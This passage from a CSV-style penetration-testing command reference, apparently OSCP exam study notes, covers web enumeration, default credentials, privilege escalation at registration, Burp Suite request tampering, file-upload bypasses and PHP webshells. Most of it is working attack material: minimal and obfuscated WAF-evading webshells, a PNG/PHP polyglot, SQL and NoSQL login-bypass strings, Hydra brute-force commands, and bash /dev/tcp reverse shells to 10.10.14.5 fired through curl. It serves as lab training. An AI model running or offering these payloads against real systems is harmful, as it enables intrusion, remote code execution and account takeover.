    whatweb reveals: WordPress 5.8.1
     wpscan --url http://target --enumerate vp
     Find plugin with known exploit

(3) Apache with mod_cgi vulnerability
    whatweb reveals: Apache/2.4.49
     Search: Shellshock, Path Traversal (CVE-2021-41773)
     Exploit for RCE

(4) Outdated PHP version
    whatweb reveals: PHP/5.6.40
     Multiple known vulnerabilities
     Exploit PHP-FPM/FastCGI issues

Version format interpretation:
Apache/2.4.41 (Ubuntu) OpenSSL/1.1.1g
                      
                       SSL library version
              Operating system
       Version number (Major.Minor.Patch)
 Software name

Critical versions to note:
- Web server (Apache, Nginx, IIS)
- Language runtime (PHP, Python, Ruby)
- Framework (Laravel, Django, Rails, WordPress)
- CMS (WordPress, Joomla, Drupal)
- Libraries (jQuery, Bootstrap)

Searching for exploits:
# SearchSploit (local ExploitDB)
searchsploit <TECHNOLOGY> <VERSION>
searchsploit -m <EDB-ID>  # Download exploit

# Google dorks
""<TECHNOLOGY> <VERSION>"" CVE
""<TECHNOLOGY> <VERSION>"" exploit
""<TECHNOLOGY> <VERSION>"" RCE

# ExploitDB online
https://www.exploit-db.com/search?q=<TECHNOLOGY>

# GitHub
site:github.com ""<TECHNOLOGY> <VERSION>"" exploit

OSCP exam tip: Run whatweb immediately after confirming web service. Focus on versions that are 2+ years old (likely vulnerable). Cross-reference with searchsploit. If no direct exploit, search for authentication bypass, RCE, file upload vulnerabilities for that technology.

Time estimate: 30 seconds (whatweb) + 5-10 minutes (CVE research)","high","","","","{""no_version_info"": ""Check page source manually: view-source:http://target. Look for meta tags, JavaScript includes, CSS files with version numbers"", ""connection_issues"": ""Verify service running: nmap -p 80,443 <TARGET>. Check URL format (http:// vs https://)"", ""too_brief_output"": ""Add -v flag for verbose. Try --aggression 3 for deeper probing (may trigger WAF)""}","{""-v"": ""Verbose output - Shows all detected plugins, versions, and details. Without this, output is brief. Essential for comprehensive technology identification and version detection""}","[""nmap-service-scan""]","","[""web-manual-enumeration""]"
"web-login-admin-panel","Web Admin Panel Login Attempt","web","Navigate to /admin, /login, /administrator and test default credentials","Access web application admin panel using default credentials, found credentials, or password reuse for privilege escalation","authentication","","CRITICAL OSCP PRIVILEGE ESCALATION: Admin panel access = RCE via file upload.

Admin panel discovery methods:
(1) Manual browsing
    - http://target/admin
    - http://target/administrator  
    - http://target/login
    - http://target/backend
    - http://target/wp-admin (WordPress)
    - http://target/phpmyadmin (Database)

(2) robots.txt
    Disallow: /admin
     Hidden admin panel location revealed

(3) Gobuster/dirb
    gobuster dir -u http://target -w /usr/share/wordlists/dirb/common.txt
     Finds /admin, /login, /administrator

(4) Page source comments
    <!-- TODO: Secure /admin/backdoor.php -->

(5) Error messages
     Redirect to /admin/login.php

Default credentials to test:
admin:admin
admin:password
admin:password123
admin:admin123
administrator:administrator
root:root
root:password
root:toor
test:test
guest:guest

Framework-specific defaults:
WordPress: admin:password
Joomla: admin:admin
Drupal: admin:admin
phpMyAdmin: root:(blank)
Tomcat: admin:admin, tomcat:tomcat

OSCP credential reuse workflow:
1. SQL injection  Dump users table
   sqlmap -r request.txt --dump -T users

2. Extract admin credentials
   admin:$2y$10$... (bcrypt hash)

3. Crack hash
   john --format=bcrypt --wordlist=rockyou.txt hashes.txt
    admin:whatever1

4. Test on admin panel (THIS COMMAND)
   Navigate to /admin
   Username: admin
   Password: whatever1
    Login successful

5. Upload webshell
    RCE achieved

Common OSCP scenarios:
(1) Database credentials work on admin panel
    From config.php: dbuser:dbpass123
    Test: /admin login with dbuser:dbpass123
     Success (password reuse)

(2) Default credentials still configured
    Fresh WordPress install: admin:password
     Immediate admin access

(3) Weak credentials
    Brute force with common passwords
    admin:admin123 works
     Admin panel compromised

(4) Password reset exploitation
    Reset form vulnerable to SQLi
     Bypass authentication
     Admin session obtained

Admin panel exploitation paths:
(1) File upload
     Upload PHP webshell
     Browse to uploaded file
     RCE achieved

(2) Plugin/theme installation (WordPress)
     Install malicious plugin with webshell
     Activate plugin
     RCE achieved

(3) Template/theme editing
     Edit theme file (404.php, header.php)
     Add PHP webshell code
     Browse to modified theme file
     RCE achieved

(4) Settings modification
     Change upload restrictions
     Enable dangerous features
     Exploit newly enabled functionality

(5) User management
     Create new admin user
     Persistence established

Burp Suite testing:
1. Intercept login request
2. Send to Intruder
3. Set payload positions (username, password)
4. Load wordlist
5. Start attack
6. Look for different response length/status

Manual credential testing:
# Small list (manual)
admin:admin
admin:password
admin:admin123

# Medium list (Burp)
Load top 100 passwords
Test against admin user

# Large list (Hydra)
hydra -l admin -P /usr/share/wordlists/rockyou.txt http-post-form ""/admin/login.php:username=^USER^&password=^PASS^:F=Invalid""

Session hijacking (if SQLi available):
1. Dump session table
   SELECT * FROM sessions WHERE user_id = 1 (admin)

2. Extract admin session token
   session_token: abc123def456

3. Set cookie in browser
   Document.cookie = ""PHPSESSID=abc123def456""

4. Refresh page
    Logged in as admin

Authentication bypass techniques:
(1) SQL injection
    Username: admin'--
    Password: anything
     Bypasses password check

(2) NoSQL injection (MongoDB)
    Username: admin
    Password: {""$ne"": """"}
     Not equal to empty = always true

(3) Session fixation
    Set session cookie before login
     Session reused after authentication

(4) Password reset token prediction
    Analyze reset token format
     Generate valid token
     Reset admin password

OSCP exam tip: Check for admin panel in first 5 minutes of web enum. Test default credentials immediately. If SQL injection found, prioritize dumping user credentials for admin access. Admin panel + file upload = guaranteed RCE.

Time estimate: 2-5 minutes (discovery) + 1-10 minutes (credential testing)","high","","","","{""cant_find_admin"": ""Common paths: /admin, /administrator, /admin.php, /login, /backend, /wp-admin (WordPress), /admin/login, /phpmyadmin. Use gobuster to find"", ""default_creds_fail"": ""Try credential combinations from SQLi dump. Test password reuse from other services. Check robots.txt for username hints"", ""account_lockout"": ""Too many failed attempts. Wait or use slower attack. Check if lockout bypassed by IP change or session reset"", ""credentials_not_working"": ""Verify correct panel (WordPress vs custom). Check for case sensitivity. Try variations (admin vs Admin, password vs Password1)""}","","[""web-manual-enumeration"", ""sqlmap-dump-table""]","","[""burpsuite-intercept-request"", ""web-access-uploaded-file"", ""create-php-webshell""]"
"user-registration-test","Test User Registration Functionality","web","Register new account and test for privilege escalation opportunities","Test user registration to create account and identify privilege escalation vectors (role manipulation, SQL injection, etc.)","authentication","","USER REGISTRATION  PRIVILEGE ESCALATION: Common OSCP vector.

Registration testing workflow:
1. Find registration page
   - /register, /signup, /create-account
   - Look for ""Sign up"" link on login page

2. Intercept registration request (Burp Suite)
   - Capture POST to /register
   - Examine parameters

3. Test for vulnerabilities (THIS STEP)
   a. Role/privilege manipulation
   b. SQL injection in registration fields
   c. Username enumeration
   d. Email verification bypass

4. Create account
   - Use test credentials
   - Document account details

5. Test account functionality
   - Login with new account
   - Explore available features
   - Look for elevation paths

Common registration vulnerabilities:
(1) Role parameter manipulation
    Normal request:
    POST /register
    username=test&password=test123&email=test@test.com

    Modified request:
    POST /register  
    username=test&password=test123&email=test@test.com&role=admin
     Account created with admin privileges

(2) SQL injection in registration
    Username: admin'-- 
     May overwrite existing admin account
     Or bypass validation

(3) Email verification bypass
    Register: user@test.com
    Intercept verification link
    Modify user_id parameter
     Verify different user's account

(4) Username collision
    Register: admin (lowercase)
     May conflict with Admin (uppercase)
     Gain Admin privileges

(5) Mass assignment
    Add parameters:
    is_admin=1, is_verified=1, role=admin
     Framework auto-assigns to user object

(6) NoSQL injection (MongoDB)
    Username: {""$ne"": null}
     Bypasses validation

(7) Client-side validation bypass
    Disable JavaScript
    Submit invalid data
     Server doesn't re-validate

Burp Suite registration testing:
1. Browse to /register
2. Fill form with test data
3. Intercept request (Proxy  Intercept)
4. Send to Repeater (Ctrl+R)
5. Add parameters:
   &role=admin
   &is_admin=true
   &user_type=administrator
6. Forward request
7. Check if account has elevated privileges

OSCP HackTheBox Usage machine example:
Standard registration:
POST /register
username=test&password=test123&email=test@test.com
 Regular user created

Modified registration (role injection):
POST /register
username=test&password=test123&email=test@test.com&role=1
 Admin user created (if role parameter not sanitized)

Testing methodology:
Test 1: Basic registration
- Register normally
- Verify account works
- Document baseline

Test 2: Role manipulation
- Add &role=admin to request
- Add &is_admin=1 to request
- Add &user_type=administrator to request
- Check if privileges elevated

Test 3: SQL injection
- Username: admin'--
- Password: anything
- Check if existing admin overwritten

Test 4: Email enumeration
- Register with existing email
- Check error message
- ""Email already registered"" = enumeration

Test 5: Username enumeration  
- Register with existing username
- Check error message
- ""Username taken"" = enumeration

Registration parameter fuzzing:
Common parameter names to test:
role, is_admin, admin, user_type, privilege, access_level, rank, status, is_verified, verified, active, approved, permissions

For each parameter, try values:
1, true, admin, administrator, root, superuser

Post-registration testing:
1. Login with new account
2. Check user profile/settings
   - Can you modify role?
   - Can you see other users?
   - Can you access admin features?

3. Test privilege escalation
   - Browse to /admin
   - Try admin functions
   - Check if role persisted

4. Session analysis
   - Examine cookies
   - Look for role in JWT
   - Modify session data

OSCP exam scenarios:
(1) Registration with role parameter
     Create admin account
     Access admin panel
     Upload webshell
     RCE

(2) SQL injection in username
     Overwrite admin account
     Login as admin with your password
     Admin access

(3) Email verification bypass
     Create account
     Modify verification token
     Verify as admin
     Elevated privileges

OSCP exam tip: If registration available, test immediately. Intercept with Burp, add privilege parameters (role, is_admin, user_type). Even if it doesn't work, you've created a test account for further testing. Common in web challenges.

Time estimate: 5-10 minutes (registration testing) + 5 minutes (privilege verification)","medium","","","","{""email_verification"": ""Try temp email services: temp-mail.org, 10minutemail.com. Or bypass: Intercept registration request, modify email to existing admin. Or look for verification token pattern"", ""registration_disabled"": ""Check if endpoint still exists but hidden. Try direct POST to /register. Look for alternate registration paths (/api/register, /signup)"", ""captcha_blocking"": ""Intercept request, remove CAPTCHA parameter. Or try automated CAPTCHA solving. Or find development/testing endpoint without CAPTCHA""}","","[""web-manual-enumeration""]","[""burpsuite-modify-upload""]","[""burpsuite-intercept-request"", ""sqli-manual-test"", ""web-login-admin-panel""]"
"burpsuite-intercept-request","Burp Suite Intercept HTTP Request","web","Proxy  Intercept  Capture request  Modify parameters  Forward","Intercept and modify HTTP requests using Burp Suite to test for parameter manipulation, SQL injection, and authentication bypass","proxy","","CRITICAL OSCP TOOL: Burp Suite for request manipulation and parameter testing.

Burp Suite setup:
1. Start Burp Suite
   burpsuite &
    Select Temporary Project
    Use Burp defaults

2. Configure browser proxy
   Firefox:
   Settings  Network Settings  Manual proxy
   HTTP Proxy: 127.0.0.1
   Port: 8080
    Use this proxy for all protocols

3. Install Burp CA certificate (for HTTPS)
   Browse to: http://burp
   Click ""CA Certificate""
   Firefox: Settings  Privacy & Security  Certificates  View Certificates  Import

4. Enable interception
   Proxy tab  Intercept sub-tab
   Click ""Intercept is on"" (should be on)

Request interception workflow:
1. Browse to target website
2. Perform action (submit form, click link)
3. Request intercepted in Burp
4. Modify parameters (THIS STEP)
5. Click ""Forward"" to send
6. View response in browser

Common modifications:
(1) Parameter injection
    Original: username=test&password=test123
    Modified: username=test&password=test123&role=admin
     Test for privilege escalation

(2) SQL injection testing
    Original: username=admin&password=pass
    Modified: username=admin'--&password=anything
     Test for SQLi in login

(3) File upload bypass
    Original: Content-Type: image/png
    Modified: Content-Type: image/png
              filename=""shell.php.png""
     Bypass upload restrictions

(4) Session token manipulation
    Original: Cookie: session=abc123
    Modified: Cookie: session=admin_session_token
     Session hijacking

(5) Hidden field modification
    Original: <input type=""hidden"" name=""price"" value=""100"">
    Modified: price=1
     Price manipulation

Burp Suite tools:
Proxy:
- Intercept: Capture and modify requests in real-time
- HTTP history: View all requests/responses
- WebSockets history: WS traffic

Repeater:
- Repeat requests with modifications
- Easier than re-intercepting
- Send with Ctrl+R from any request

Intruder:
- Automated parameter fuzzing
- Brute force attacks
- Wordlist-based testing

Decoder:
- URL encode/decode
- Base64 encode/decode
- HTML encode/decode

Comparer:
- Compare two requests/responses
- Identify differences

Common OSCP use cases:
(1) Password reset token manipulation
    Intercept reset request
    POST /reset
    email=victim@test.com&token=abc123
    
    Modify email:
    email=attacker@test.com&token=abc123
     Reset attacker's password with victim's token

(2) File upload type bypass  
    Intercept upload request
    Content-Type: application/x-php
    
    Change to allowed type:
    Content-Type: image/png
     Upload PHP shell as PNG

(3) Parameter pollution
    Original: ?id=1
    Modified: ?id=1&id=2&id=3
     May bypass validation

(4) HTTP method manipulation
    Original: POST /admin
    Modified: GET /admin
     Bypass method-based access control

(5) Authentication bypass
    Original: username=test&password=wrong
    Modified: username=admin'-- &password=anything
     SQL injection auth bypass

Saving requests for later:
1. Right-click request  ""Copy to file""
2. Save as reset.req
3. Use with SQLMap:
   sqlmap -r reset.req -p email

OSCP workflow for password reset exploitation:
1. Navigate to password reset
2. Enter email, intercept request (THIS COMMAND)
3. Modify email parameter
   POST /reset  
   email=victim@test.com  email=attacker@test.com
4. Forward request
5. Check if token sent to attacker email
6. Use token to reset victim password

Burp Suite keyboard shortcuts:
Ctrl+R: Send to Repeater
Ctrl+I: Send to Intruder
Ctrl+Space: Toggle intercept
Ctrl+Shift+B: Base64 encode
Ctrl+Shift+U: URL encode

Repeater workflow (easier than intercepting):
1. Intercept request once
2. Send to Repeater (Ctrl+R)
3. Modify in Repeater
4. Click ""Send""
5. View response immediately
6. Modify again, resend
 Much faster for testing multiple variations

OSCP exam tip: Use Burp for ALL web testing. Intercept login, registration, upload, password reset requests. Look for hidden parameters, role fields, admin flags. Save important requests to files for SQLMap. Repeater is faster than re-intercepting.

Time estimate: 30 seconds per request interception + variable modification time","high","","","","{""not_intercepting"": ""Check Intercept is ON (button shows 'Intercept is on'). Verify browser proxy settings (127.0.0.1:8080). Check Target Scope (may be filtering)"", ""ssl_errors"": ""Install Burp CA certificate. Browser: Visit http://burp, download certificate, install in browser settings"", ""cant_modify"": ""Request is in view mode. Click 'Intercept is on' to enable. Or send to Repeater (Ctrl+R) for easier modification""}","","[""web-manual-enumeration""]","","[""burpsuite-modify-upload"", ""sqli-manual-test"", ""user-registration-test""]"
"burpsuite-modify-upload","Burp Suite Modify File Upload","web","Intercept upload request  Modify Content-Type  Modify filename  Forward","Bypass file upload restrictions using Burp Suite to upload webshell by modifying Content-Type headers and filenames","file-upload","","CRITICAL OSCP RCE VECTOR: File upload bypass  Webshell upload  RCE.

File upload bypass techniques:
(1) Content-Type manipulation
    Client-side validation (BYPASS)
    Original request:
    Content-Type: application/x-php
    filename=""shell.php""
    
    Modified (THIS TECHNIQUE):
    Content-Type: image/png
    filename=""shell.php""
     Bypass MIME type check

(2) Double extension
    filename=""shell.php.png""
     Server processes as PHP if misconfigured

(3) Null byte injection (older PHP)
    filename=""shell.php%00.png""
     Truncates at null byte, saves as shell.php

(4) Case sensitivity bypass
    filename=""shell.PhP""
     Blacklist may only check .php (lowercase)

(5) Alternate PHP extensions
    .phtml, .php3, .php4, .php5, .phar, .phps
     May not be blacklisted

(6) Path traversal
    filename=""../../../var/www/html/shell.php""
     Upload to web-accessible location

(7) Polyglot file (magic bytes + PHP)
    PNG header + PHP code
     Passes magic byte validation
     Executes as PHP if accessed directly

Burp Suite file upload bypass workflow:
1. Prepare webshell
   Create shell.php with PHP webshell code

2. Attempt normal upload
   Upload shell.php through web form
    Likely rejected

3. Intercept upload request (THIS STEP)
   Burp  Proxy  Intercept ON
   Re-submit upload
    Request captured

4. Analyze request
   POST /upload HTTP/1.1
   Content-Type: multipart/form-data; boundary=----123
   
   ------123
   Content-Disposition: form-data; name=""file""; filename=""shell.php""
   Content-Type: application/x-php
   
   <?php system($_GET['cmd']); ?>
   ------123--

5. Modify for bypass
   Change Content-Type: image/png
   Or change filename: shell.php.png
   Or both

6. Forward request
    Upload successful

7. Access uploaded file
   http://target/uploads/shell.php.png?cmd=whoami
    RCE achieved

Common upload locations:
/uploads/
/upload/
/files/
/images/
/media/
/assets/
/user_uploads/
/public/uploads/
/var/www/html/uploads/

Finding upload directory:
Method 1: Check upload response
 {""status"":""success"",""path"":""/uploads/file.php""}

Method 2: View page source
 <img src=""/uploads/image.png"">

Method 3: Gobuster
gobuster dir -u http://target -w /usr/share/wordlists/dirb/common.txt
 /uploads (Status: 200)

Method 4: Burp response
Upload test file, check response headers
 Location: /uploads/test.txt

OSCP HackTheBox Usage machine example:
1. Admin panel has avatar upload
2. Upload shell.php  Rejected (""Only images allowed"")
3. Intercept with Burp
4. Modify:
   filename=""shell.php""
   Content-Type: image/png
5. Forward  Upload successful
6. Find upload directory:
   View profile page source
    <img src=""/avatars/shell.php"">
7. Access webshell:
   http://target/avatars/shell.php?cmd=whoami
    www-data
8. Execute reverse shell:
   http://target/avatars/shell.php?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.5%2F9001%200%3E%261%27
    Shell received

Polyglot file creation:
# Create PNG with PHP code
printf '\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x01\x00\x00\x00\x007n\xf9$\x00\x00\x00\nIDATx\x9cc`\x00\x00\x00\x02\x00\x01H\xaf\xa4q\x00\x00\x00\x00IEND\xaeB`\x82<?php system($_GET[""cmd""]); ?>' > shell.php.png

# Upload shell.php.png
# Access as PHP:
http://target/uploads/shell.php.png?cmd=id
 If server executes PHP in images directory, RCE

Alternate extensions to test:
.php  Blocked
.phtml  Try this
.php3  Try this  
.php4  Try this
.php5  Try this
.phar  Try this
.phps  Try this

Bypass validation checklist:
 Content-Type: image/png, image/jpeg, image/gif
 Filename: shell.php.png, shell.png.php, shell.php%00.png
 Extension: .phtml, .php3, .php4, .php5
 Path traversal: ../../../uploads/shell.php
 Case variation: shell.PhP, shell.Php
 Magic bytes: Add PNG header to PHP file
 Double upload: Upload image first, then PHP with same name

Verifying upload:
# Check if file uploaded
curl http://target/uploads/shell.php

# Test command execution  
curl http://target/uploads/shell.php?cmd=id
 uid=33(www-data) gid=33(www-data)

# Get reverse shell
curl 'http://target/uploads/shell.php?cmd=bash%20-c%20""bash%20-i%20>%26%20/dev/tcp/10.10.14.5/9001%200>%261""'

OSCP exam tip: File upload = HIGH priority target. Immediately test with Burp modification. Try Content-Type bypass first (fastest). If rejected, try double extension, then alternate extensions. Document upload directory location. One successful webshell upload = guaranteed RCE.

Time estimate: 2-5 minutes (bypass testing) + 1 minute (RCE verification)","high","","","","{""still_rejected"": ""Server-side validation checking actual file content (magic bytes). Need to craft polyglot file: Add PHP code to valid image file. Or try different extensions: .phtml, .php3, .php5, .phar"", ""uploaded_but_not_executable"": ""File uploaded to location without PHP execution. Find upload directory: check response, source code, gobuster. Try path traversal: ../../../var/www/html/shell.php"", ""cant_find_uploaded_file"": ""Check response for upload path. Intercept upload, check response. Brute force upload directory: gobuster dir -u http://target/uploads -w wordlist.txt""}","","[""burpsuite-intercept-request"", ""web-manual-enumeration""]","[""create-php-webshell""]","[""web-access-uploaded-file"", ""webshell-execute-revshell"", ""create-php-webshell""]"
"create-php-webshell","Create PHP Webshell","web","echo '<?php system($_GET[""cmd""]); ?>' > shell.php","Create simple PHP webshell for command execution after file upload bypass or arbitrary file write vulnerability","webshell","","PHP WEBSHELL: Minimal code for maximum RCE.

Webshell variations:
(1) Minimal (THIS COMMAND)
    <?php system($_GET['cmd']); ?>
    Usage: shell.php?cmd=whoami
     Smallest, easiest to upload

(2) Shell_exec (better output handling)
    <?php echo shell_exec($_GET['cmd']); ?>
    Usage: shell.php?cmd=ls -la
     Returns full output including stderr

(3) Passthru (binary-safe)
    <?php passthru($_GET['cmd']); ?>
    Usage: shell.php?cmd=cat /etc/passwd
     Good for binary files

(4) Exec (array output)
    <?php exec($_GET['cmd'], $output); print_r($output); ?>
    Usage: shell.php?cmd=id
     Returns array of output lines

(5) Multi-parameter  
    <?php system($_POST['cmd']); ?>
    Usage: curl -X POST -d 'cmd=whoami' http://target/shell.php
     Harder to detect in logs

(6) Obfuscated (bypass WAF)
    <?php $a='sys'.'tem'; $a($_GET['c']); ?>
    Usage: shell.php?c=id
     Evades simple keyword detection

(7) Base64 encoded
    <?php eval(base64_decode($_GET['c'])); ?>
    Usage: shell.php?c=c3lzdGVtKCdpZCcp
     Very evasive

(8) Full-featured (not minimal)
    <?php
    if(isset($_GET['cmd'])) {
      $cmd = $_GET['cmd'];
      echo ""<pre>"";
      system($cmd);
      echo ""</pre>"";
    }
    ?>
     Better formatting, safer

Webshell upload workflow:
1. Create webshell (THIS COMMAND)
   echo '<?php system($_GET[""cmd""]); ?>' > shell.php

2. Upload via file upload
   Navigate to upload form
   Select shell.php
   Intercept with Burp
   Modify Content-Type to image/png
   Forward
    Upload successful

3. Find upload location
   Check response: {""path"":""/uploads/shell.php""}
   Or check page source
   Or gobuster

4. Access webshell
   http://target/uploads/shell.php?cmd=whoami
    www-data

5. Execute commands
   http://target/uploads/shell.php?cmd=id
   http://target/uploads/shell.php?cmd=pwd
   http://target/uploads/shell.php?cmd=ls -la

6. Get reverse shell
   http://target/uploads/shell.php?cmd=bash -c 'bash -i >& /dev/tcp/10.10.14.5/9001 0>&1'
    Full interactive shell

Command execution via webshell:
# URL encode special characters
whoami  whoami
ls -la  ls%20-la
cat /etc/passwd  cat%20/etc/passwd
id  id

# Complex commands need full URL encoding
bash -c 'bash -i >& /dev/tcp/10.10.14.5/9001 0>&1'
 bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.5%2F9001%200%3E%261%27

Using curl for webshell:
# GET request
curl 'http://target/shell.php?cmd=whoami'
 www-data

# POST request (stealthier)
curl -X POST -d 'cmd=id' http://target/shell.php
 uid=33(www-data)

# Reverse shell via webshell
curl 'http://target/shell.php?cmd=bash%20-c%20""bash%20-i%20>%26%20/dev/tcp/10.10.14.5/9001%200>%261""'

OSCP HackTheBox Usage machine workflow:
1. Admin panel avatar upload
2. Create shell.php (THIS COMMAND)
3. Upload  Rejected
4. Burp intercept
5. Change Content-Type: image/png
6. Forward  Success
7. Access: http://usage.htb/avatars/shell.php?cmd=id
    uid=33(www-data)
8. Reverse shell:
   nc -lvnp 9001  # Attacker
   http://usage.htb/avatars/shell.php?cmd=bash -c 'bash -i >& /dev/tcp/10.10.14.5/9001 0>&1'
    Shell received

Advanced webshell features:
# File browser
<?php
if(isset($_GET['path'])) {
  $files = scandir($_GET['path']);
  print_r($files);
}
?>
Usage: shell.php?path=/var/www/html

# File read
<?php
if(isset($_GET['file'])) {
  echo file_get_contents($_GET['file']);
}
?>
Usage: shell.php?file=/etc/passwd

# Command + file operations
<?php
if(isset($_GET['cmd'])) system($_GET['cmd']);
if(isset($_GET['file'])) echo file_get_contents($_GET['file']);
?>

Webshell detection evasion:
(1) Rename function
    $a='sys'.'tem'; $a($_GET['c']);

(2) Variable function name
    $f=$_GET['f']; $f($_GET['c']);
    Usage: shell.php?f=system&c=id

(3) Preg_replace (deprecated but works)
    preg_replace('/.*/e', $_GET['c'], '');

(4) Assert (disabled in PHP 7.2+)
    assert($_GET['c']);

(5) Create_function (deprecated)
    $f=create_function('',$_GET['c']); $f();

Troubleshooting PHP execution:
# Check if PHP enabled
curl http://target/test.php
 If code displayed = not enabled
 If executed = enabled

# Check upload directory for PHP execution
Create .htaccess in uploads/:
AddType application/x-httpd-php .png
 Enables PHP execution for .png files

# Alternative upload locations
/var/www/html/ (web root, usually executable)
/tmp/ (writable but not web-accessible)
/var/tmp/ (writable but not web-accessible)

OSCP exam tip: Create webshell BEFORE exam (save as template). Test upload immediately when finding upload form. Minimal webshell easier to upload (fewer WAF triggers). URL-encode reverse shell command before using in webshell. Document webshell location in breakthrough.md.

Time estimate: 30 seconds (creation) + 1-2 minutes (upload and testing)","high","","","","{""code_shown_not_executed"": ""PHP not enabled in upload directory. Check .htaccess: AddType application/x-httpd-php .png. Or find PHP-enabled directory"", ""file_not_found"": ""Upload failed or wrong location. Check upload response for path. Try gobuster to find uploads directory"", ""no_output"": ""Command executed but no output captured. Try different PHP function: shell_exec, passthru, exec. Or check if output being suppressed"", ""waf_blocking"": ""WAF detecting 'system', 'exec' keywords. Obfuscate: <?php $a='sys'.'tem'; $a($_GET['c']); ?>. Or base64 encode payload""}","","[""burpsuite-modify-upload""]","","[""web-access-uploaded-file"", ""webshell-execute-revshell"", ""burpsuite-modify-upload""]"
"web-access-uploaded-file","Access Uploaded Webshell","web","curl 'http://<TARGET>/uploads/<FILENAME>?cmd=<COMMAND>'","Access uploaded PHP webshell via HTTP request to execute commands and verify RCE","webshell","curl 'http://usage.htb/uploads/shell.php?cmd=whoami'","WEBSHELL ACCESS  COMMAND EXECUTION  REVERSE SHELL: Standard RCE workflow.

Webshell access methods:
(1) curl (THIS COMMAND)
    curl 'http://target/uploads/shell.php?cmd=whoami'
     Best for scripting and reverse shells

(2) Browser
    http://target/uploads/shell.php?cmd=whoami
     Good for interactive testing

(3) wget
    wget -q -O - 'http://target/uploads/shell.php?cmd=id'
     Alternative to curl

(4) Python requests
    import requests
    r = requests.get('http://target/uploads/shell.php', params={'cmd':'id'})
    print(r.text)

Common commands to test:
# Verify execution
whoami  www-data, apache, nginx
id  uid=33(www-data) gid=33(www-data)
pwd  /var/www/html/uploads

# System enumeration
uname -a  Linux info
hostname  target hostname
cat /etc/passwd  User list
ls -la /home  Home directories

# Network enumeration  
ifconfig / ip a  IP addresses
netstat -tulpn  Listening ports
ps aux  Running processes

# File system
ls -la  Current directory
cat /etc/passwd  Users
find / -perm -4000 2>/dev/null  SUID binaries

URL encoding for webshells:
Spaces: %20 or +
Forward slash: %2F
Ampersand: %26
Pipe: %7C
Semicolon: %3B
Greater than: %3E
Less than: %3C
Single quote: %27
Double quote: %22

URL encoding examples:
# Simple command (no encoding needed)
whoami  whoami
id  id
pwd  pwd

# Command with spaces
ls -la  ls%20-la
cat /etc/passwd  cat%20/etc/passwd

# Complex command with pipes/redirects
ls -la | grep user  ls%20-la%20%7C%20grep%20user
cat /etc/passwd | cut -d: -f1  cat%20/etc/passwd%20%7C%20cut%20-d%3A%20-f1

# Reverse shell (full encoding)
bash -c 'bash -i >& /dev/tcp/10.10.14.5/9001 0>&1'
 bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.5%2F9001%200%3E%261%27

Finding upload directory:
(1) Check upload response
     {""status"":""success"",""file"":""/uploads/shell.php""}

(2) View page source
     <img src=""/avatars/profile.png"">
     Try /avatars/shell.php

(3) Gobuster
    gobuster dir -u http://target -w /usr/share/wordlists/dirb/common.txt
     /uploads (Status: 200)

(4) Common paths
    /uploads/, /upload/, /files/, /images/, /media/,
    /avatars/, /pictures/, /assets/, /public/uploads/

OSCP workflow:
1. Create webshell
   echo '<?php system($_GET[""cmd""]); ?>' > shell.php

2. Upload with Burp bypass
   Intercept, modify Content-Type, forward

3. Find upload path
   Check response or gobuster

4. Test webshell (THIS COMMAND)
   curl 'http://target/uploads/shell.php?cmd=whoami'
    www-data

5. Enumerate system
   curl 'http://target/uploads/shell.php?cmd=id'
   curl 'http://target/uploads/shell.php?cmd=uname -a'
   curl 'http://target/uploads/shell.php?cmd=ls -la /home'

6. Get reverse shell
   nc -lvnp 9001  # Attacker
   curl 'http://target/uploads/shell.php?cmd=bash -c ""bash -i >& /dev/tcp/10.10.14.5/9001 0>&1""'
    Full shell received

Debugging webshell access:
# Test 1: Does file exist?
curl -I http://target/uploads/shell.php
 200 OK = File exists
 404 Not Found = Wrong path

# Test 2: Is PHP executing?
curl http://target/uploads/shell.php
 If you see PHP code = Not executing
 If empty or error = Executing but no output

# Test 3: Simple command
curl 'http://target/uploads/shell.php?cmd=echo success'
 ""success"" = Working

# Test 4: Check user
curl 'http://target/uploads/shell.php?cmd=whoami'
 www-data = Executing as web user

Quick enumeration via webshell:
# One-liner for multiple commands
for cmd in whoami id pwd ""uname -a"" ""ls -la""; do
  echo ""[+] $cmd""
  curl -s ""http://target/uploads/shell.php?cmd=$cmd""
  echo
done

OSCP exam tip: Test webshell with simple command first (whoami) before complex reverse shell. Save working webshell URL in notes. Use curl for automation, browser for interactive testing. If webshell works, immediately escalate to reverse shell (easier to work with).

Time estimate: 30 seconds (verification) + 2-5 minutes (enumeration)","high","","","","{""file_not_found"": ""Wrong upload path. Check upload response for actual location. Try common paths: /uploads, /files, /avatars, /images. Use gobuster to find directory"", ""php_code_displayed"": ""PHP execution disabled in upload directory. Try different upload location. Check if .htaccess can enable PHP. Look for path traversal during upload"", ""no_output"": ""Command executed but no output. Try: echo shell_exec() instead of system(). Or check for output suppression. Verify with: shell.php?cmd=echo success"", ""special_chars_broken"": ""URL encoding issue. Encode command properly: spaces=%20, &=%26, |=%7C. Use curl with quotes: curl 'http://...' not curl http://...""}","","[""create-php-webshell"", ""burpsuite-modify-upload""]","","[""webshell-execute-revshell"", ""pty-spawn-script""]"
"webshell-execute-revshell","Execute Reverse Shell via Webshell","web","curl 'http://<TARGET>/uploads/<WEBSHELL>?cmd=bash -c ""bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1""'","Execute reverse shell command through webshell to upgrade from command execution to full interactive shell","webshell","curl 'http://usage.htb/uploads/shell.php?cmd=bash -c ""bash -i >& /dev/tcp/10.10.14.5/9001 0>&1""'","WEBSHELL  REVERSE SHELL: Upgrade to full interactive shell.

WHY upgrade to reverse shell:
(1) Interactive: Tab completion, job control, text editors work
(2) Persistent: Doesn't timeout like webshell HTTP requests
(3) Stable: Less prone to connection drops
(4) Functional: Can run interactive commands (su, sudo, ssh)
(5) Faster: No URL encoding, direct command execution

Reverse shell workflow:
1. Start listener on attacker
   nc -lvnp 9001
    Listening on 0.0.0.0 9001

2. Execute reverse shell via webshell (THIS COMMAND)
   curl 'http://target/uploads/shell.php?cmd=bash -c ""bash -i >& /dev/tcp/10.10.14.5/9001 0>&1""'

3. Receive connection
   Connection from 10.10.11.18:54321
   www-data@target:/$

4. Upgrade to PTY
